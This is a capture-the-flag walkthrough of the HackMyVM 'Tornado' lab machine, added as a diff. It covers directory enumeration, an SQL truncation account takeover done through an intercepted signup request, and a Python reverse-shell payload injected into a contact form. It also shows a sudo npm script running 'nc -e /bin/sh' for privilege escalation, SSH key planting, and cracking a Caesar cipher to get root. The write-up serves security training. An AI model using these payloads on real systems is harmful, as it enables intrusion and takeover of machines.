@@ -1,0 +1,185 @@
+### https://hackmyvm.eu/machines/machine.php?vm=Tornado ###
+
+ip=<targetIP>
+url=http://$ip
+
+threader3000
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 0f:57:0d:60:31:4a:fd:2b:db:3e:9e:2f:63:2e:35:df (RSA)
+|   256 00:9a:c8:d3:ba:1b:47:b2:48:a8:88:24:9f:fe:33:cc (ECDSA)
+|_  256 6d:af:db:21:25:ee:b0:a6:7d:05:f3:06:f0:65:ff:dc (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url -x php,txt,tar,zip,old,bak -t 60 -e 
+
+
+
+we found 
+301      GET        9l       28w      314c http://$ip/bluesky => http://$ip/bluesky/
+
+feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url/bluesky -x php,txt,tar,zip,old,bak -t 60 -e 
+
+200      GET       38l       71w      825c http://$ip/bluesky/signup.php
+200      GET       38l       71w      824c http://$ip/bluesky/login.php
+
+
+lets create an account on signup page
+
+after we logged in
+
+We can see a dashboard
+going to Portfolio
+We get the following msg
+LFI vulnerability is patched , but still don't forget to test for it again ! 
+
+view-source:http://$ip/bluesky/port.php
+
+<!-- /home/tornado/imp.txt -->    ( line 165 )
+
+i tried http://$ip/../../../home/tornado/imp.txt // not working //
+
+/home/tornado/imp.txt is the same with ~/imp.txt
+
+lets try http://$ip/bluesky/~/imp.txt // Not Working //
+lets try http://$ip/bluesky/~tornado/imp.txt // Not Working //
+
+lets try http://$ip/~tornado/imp.txt // Finally Working //
+
+ceo@tornado
+cto@tornado
+manager@tornado
+hr@tornado
+lfi@tornado
+admin@tornado
+jacob@tornado
+it@tornado
+sales@tornado
+
+
+SQL Truncation Attack:
+Lets go back to signup page
+
+fire up Burp and register with jacob
+
+POST /bluesky/signup.php HTTP/1.1
+Host: 10.10.10.116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Origin: http://10.10.10.116
+Connection: close
+Referer: http://10.10.10.116/bluesky/signup.php
+Cookie: PHPSESSID=h9u218je6anmhto802vbsl21lr
+Upgrade-Insecure-Requests: 1
+
+uname=jacob%40tornado&upass=1234&btn=Signup
+
+
+//// CHANGE uname=jacob%40tornado 1&upass=1234&btn=Signup /////
+
+and forward
+
+Now you have succesfuly reseted jacobs password.
+
+
+login and go to contact
+
+nc -lvnp <CHOSE A PORT>
+
+insert python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",YOUR PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Upgrade the shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl+z
+
+stty -a; stty raw -echo; fg
+
+export SHELL=bash
+export TERM=xterm
+stty rows (values from stty -a) cols (values from stty -a)
+
+
+
+sudo -l 
+
+(catchme) NOPASSWD: /usr/bin/nmp
+
+cd /tmp
+mkdir cool
+cd cool
+
+pico package.json
+
+{
+  "name": "cool",
+  "version": "1.0.0",
+  "description": "CooLWasHere",
+  "main": "index.js",
+  "scripts": {
+    "cool": "nc <YOUR IP> 1234 -e /bin/sh"
+  },
+  "author": "",
+  "license": "UNLICENSED"
+}
+
+
+
+
+nc -nvlp 1234
+
+back to the RS
+sudo -u catchme /usr/bin/npm run cool
+
+check your listener
+
+id
+uid=1000(catchme) gid=1000(catchme) groups=1000(catchme),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+cd
+mkdir .ssh
+chmod 755 .ssh
+cd .ssh
+echo 'ssh-rsa <YOUR id_rsa>' >> authorized_keys
+chmod 644 authorized_keys
+
+exit
+
+ssh catchme@$ip  
+catchme@tornado:~$ ls
+enc.py  user.txt
+
+cat enc.py 
+s = "abcdefghijklmnopqrstuvwxyz"
+shift=0
+encrypted="hcjqnnsotrrwnqc"
+#
+k = input("Input a single word key :")
+if len(k) > 1:
+        print("Something bad happened!")
+        exit(-1)
+
+
+Decrypt the encrypted string
+
+https://md5decrypt.net/en/Caesar/
+add hcjqnnsotrrwnqc to the left sight and play with the shift 1..2..3 etc
+
+When you find the correct shift you will get "somehow" the password
+then think about it and you will get the correct password
+
+catchme@tornado:~$ su root
+Password: 
+root@tornado:/home/catchme# 
